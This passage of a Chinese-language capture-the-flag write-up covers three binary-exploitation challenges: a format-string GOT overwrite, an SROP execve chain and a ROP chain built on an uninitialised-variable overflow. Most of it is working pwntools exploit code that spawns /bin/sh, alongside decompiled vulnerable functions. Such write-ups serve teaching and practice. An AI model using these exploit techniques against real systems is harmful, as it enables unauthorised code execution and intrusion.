punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>output <span class="token operator">=</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>leaked_stack <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>output<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'?'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>leak_libc <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>output<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'?'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>ret_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>output<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'?'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> ret_addr <span class="token operator">-</span> <span class="token number">78</span>pm_base <span class="token operator">=</span> main_addr <span class="token operator">-</span> <span class="token number">0x1288</span>printf_got <span class="token operator">=</span> pm_base <span class="token operator">+</span> <span class="token number">0x4028</span>i_addr <span class="token operator">=</span> leaked_stack <span class="token operator">-</span> <span class="token number">0xf0</span> <span class="token operator">+</span> <span class="token number">0xef</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leaked_stack: "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leaked_stack<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"i_addr: "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak_libc: "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_libc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"print_got"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>read_addr <span class="token operator">=</span> leak_libc <span class="token operator">-</span> <span class="token number">18</span>system_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>read_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>lib_base <span class="token operator">=</span> read_addr <span class="token operator">-</span> read_offsetsystem_addr <span class="token operator">=</span> lib_base <span class="token operator">+</span> system_offsetbinsh_addr <span class="token operator">=</span> lib_base <span class="token operator">+</span> binshpop_rdi_ret <span class="token operator">=</span> lib_base <span class="token operator">+</span> <span class="token number">0x000000000002a3e5</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"rdi:"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b''</span>payload <span class="token operator">+=</span> <span class="token string">b"%200c%10$hhnxxxx"</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>i_addr<span class="token punctuation">)</span><span class="token comment">#payload = b"%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write_system_faster</span><span class="token punctuation">(</span>printf_got<span class="token punctuation">,</span> system_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    printf_got2 <span class="token operator">=</span> printf_got <span class="token operator">+</span> <span class="token number">2</span>    <span class="token comment"># 写入低 2 字节</span>    low_2_bytes <span class="token operator">=</span> system_addr <span class="token operator">&amp;</span> <span class="token number">0xffff</span>    low_3_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>system_addr <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>      a <span class="token operator">=</span> low_2_bytes <span class="token operator">&amp;</span> <span class="token number">0xff</span>    adjusted_high_byte <span class="token operator">=</span> low_3_bytes <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token operator">-</span> a  <span class="token comment"># 处理回绕</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"low_3_bytes: "</span><span class="token punctuation">,</span>low_3_bytes<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>low_2_bytes<span class="token punctuation">&#125;</span></span><span class="token string">c%12$hn"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>adjusted_high_byte<span class="token punctuation">&#125;</span></span><span class="token string">c%13$hhn"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">7</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>printf_got2<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    write_system_faster<span class="token punctuation">(</span>printf_got<span class="token punctuation">,</span> system_addr<span class="token punctuation">)</span><span class="token comment">#payload = b"%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment">#gdb.attach(io)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"/bin/sh\x00"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Hard-syscall"><a href="#Hard-syscall" class="headerlink" title="Hard_syscall"></a>Hard_syscall</h2><p>IDA打开之后震惊了，一个极简的程序，出题人是纯汇编写的吗？</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  _BYTE v1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> Nothing<span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给了一个充足的栈溢出，但是除此之外啥也没有，经过上一个ret2syscall的暗示，知道又要利用sigreturn了</p><p>第一个难点在于虽然可以自由地ROP，自由地跳转到syscall，但是没有正确设置rax的手段……并非，rax是函数的返回值存放的地方，而read函数返回值为读入的字节数，只需要触发一个read，输入15个字节，再跳到syscall就实现了！</p><p>接下来的思路依然是用sigreturn执行execve(“/bin/sh\x00”)，这里binsh需要自己写入，正好接着读15字节的机会，再取data段找一个可写的地址塞进去，统统放进SigreturnFrame里</p><p>sigreturn会破坏原有的ROP链，很显然原有的rsp rbp都丢掉了，所以第一轮利用之后需要重新布置栈，需要把rip改到read函数处再读一遍，buf改到可控的地方，构建出新的ROP链，也就是再read一遍15字节触发sigreturn把binsh的地址等等传进去，完美<code>cat flag</code></p><p>最后一轮的rsp需要设置成一个安全的值，否则归0会崩溃，栈迁移的经验告诉我不一定非得是0x7ff开头的地方<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>read_addr <span class="token operator">=</span> <span class="token number">0x40106A</span>write_addr <span class="token operator">=</span> <span class="token number">0x401072</span>ret_addr <span class="token operator">=</span> <span class="token number">0x401035</span>system_addr <span class="token operator">=</span> <span class="token number">0x040106F</span>fail_data <span class="token operator">=</span> <span class="token number">0x402000</span>p_data <span class="token operator">=</span> <span class="token number">0x402008</span><span class="token comment">#io = process("./pwn")</span>io <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token string">"host.docker.internal"</span><span class="token punctuation">,</span><span class="token number">49133</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"now!"</span><span class="token punctuation">)</span>frame1 <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>frame1<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>                  <span class="token comment"># read</span>frame1<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>                  <span class="token comment"># stdin</span>frame1<span class="token punctuation">.</span>rsi <span class="token operator">=</span> fail_data          <span class="token comment"># 写目标</span>frame1<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0x140</span>                  frame1<span class="token punctuation">.</span>rip <span class="token operator">=</span> read_addr          <span class="token comment"># 执行 read</span>frame1<span class="token punctuation">.</span>rsp <span class="token operator">=</span> p_dataframe2 <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>frame2<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">59</span>                  <span class="token comment"># execve</span>frame2<span class="token punctuation">.</span>rdi <span class="token operator">=</span> fail_data           <span class="token comment"># /bin/sh\x00</span><span class="token comment">#frame2.rdx = 0</span>frame2<span class="token punctuation">.</span>rip <span class="token operator">=</span> system_addr          <span class="token comment"># system</span>frame2<span class="token punctuation">.</span>rsp <span class="token operator">=</span> p_data             <span class="token comment">#随便写一个</span>payload <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment">#24</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> payload <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>frame1<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">15</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>new_stack <span class="token operator">=</span> <span class="token string">b"/bin/sh\x00"</span>new_stack <span class="token operator">+=</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>new_stack <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> new_stack <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>frame2<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>new_stack<span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">b"/bin/sh"</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span><span class="token operator">*</span><span class="token number">8</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#gdb.attach(io)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="ez-dinner"><a href="#ez-dinner" class="headerlink" title="ez-dinner"></a>ez-dinner</h2><p>两个函数<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">Myinit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to ldz's Ciber-Stack-Dinner!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Today's special: Segmentation fault or maybe Nothing happened — served with a stack sauce."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Don't worry, we saved your return address... maybe..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>再仔细一看<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  _QWORD buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-110h] BYREF</span>  <span class="token keyword">char</span> v2<span class="token punctuation">[</span><span class="token number">240</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-100h] BYREF</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+100h] [rbp-10h]</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+10Ch] [rbp-4h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"So please show me your dinner Admission ticket."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You are not authorized to attend this dinner."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Name: %lx\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Age:  %lx\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> v2<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Description: %.*s\n"</span><span class="token punctuation">,</span> <span class="token number">240</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>没有栈溢出，但是有输出，可能会泄露出什么，继续看func2</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-64h] BYREF</span>  _QWORD buf<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-60h] BYREF</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-8h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+6Ch] [rbp-4h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How many dishes would u like to eat?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%1d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Okey, then What would you like to eat?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8LL</span> <span class="token operator">*</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> v1<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    v3 <span class="token operator">+=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Cooking ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The food is served.\nWish you a happy meal!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  i <span class="token operator">=</span> v3 <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span>v3 <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">food1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">food2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">food3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要找栈溢出只能从<code>read(0, buf, 8LL * v1);</code>入手，scanf(“%1d”, &amp;v1);强制只能读入一个字节，表面上只能读入0-9实际上如果输入非法字符会被拒收，这样v1就是未初始化的，而func1恰好可以往栈上写入很多东西，于是借此机会把v1改成大数，于是栈溢出就有了</p><p>没有后门函数和syscall，给了libc，显然接下来要想办法搞到libc的基址正好可以利用func1的泄露，如果输入没有覆盖，岂不是会读到未定义的东西，试了一下果然出现了libc里的函数地址</p><p>接下来就简单了，第二轮的func1没碰太多栈，于是再次进入func2，v1还是未初始化的值，栈溢出依然存在，于是顺理成章ROP即可</p><p>一个坑点是，func1的输入<code>\n</code>，由于算输入非法，输入内容没有被接收就还停留在缓冲区里等着下一次输入，然后进了scanf，导致payload被本来发给scanf的字符截胡，可气的是出现了本地gdb里能跑通，退出gdb就跑不通的诡异情况，好一顿排查……其实没有，一调试就是成功，偶然注意到输入输出不对劲才反应过来，gdb把两次输入拼到了一起，而本地和远程都没有！</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>ret_addr <span class="token operator">=</span> <span class="token number">0x40129E</span>binsh <span class="token operator">=</span> <span class="token number">0x4022A3</span>call_1 <span class="token operator">=</span> <span class="token number">0x4015C6</span>bss_addr <span class="token operator">=</span> <span class="token number">0x4040A0</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token comment"># 连接目标</span><span class="token comment">#p = process('./dinner')</span>p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token string">"host.docker.internal"</span><span class="token punctuation">,</span><span class="token number">51040</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./dinner'</span><span class="token punctuation">)</span>rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>pop_rdi_ret_offset <span class="token operator">=</span> rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rdi'</span><span class="token punctuation">,</span> <span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>system_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>puts_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token comment"># 阶段1：设置 v1 残留值</span>payload1 <span class="token operator">=</span>  <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">0xac</span>  <span class="token comment"># 填充到 v1 位置 (172 字节)</span>payload1 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> <span class="token string">b'B'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">256</span> <span class="token operator">-</span> <span class="token number">0xac</span> <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span>  <span class="token comment"># 填充剩余</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"ticket."</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token comment"># 阶段2：让 scanf 失败</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"How many dishes would u like to eat?"</span><span class="token punctuation">)</span><span class="token comment">#gdb.attach(p)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token punctuation">)</span>  <span class="token comment"># 非数字输入，scanf 失败</span><span class="token comment">#第三步，回到开头泄露地址</span>payload2 <span class="token operator">=</span> <span class="token string">b'B'</span> <span class="token operator">+</span> <span class="token string">b'C'</span> <span class="token operator">*</span> <span class="token number">87</span>   <span class="token comment"># 填满 buf[11]</span>payload2 <span class="token operator">+=</span> <span class="token string">b'D'</span> <span class="token operator">*</span> <span class="token number">8</span>   <span class="token comment"># 填充</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>   <span class="token comment"># 填充rbp</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>call_1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"What would you like to eat?"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token comment">#第四步，跳过输入，泄露</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"ticket."</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>name <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>age_line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"age:"</span><span class="token punctuation">,</span>age_line<span class="token punctuation">)</span>age_hex <span class="token operator">=</span> age_line<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token 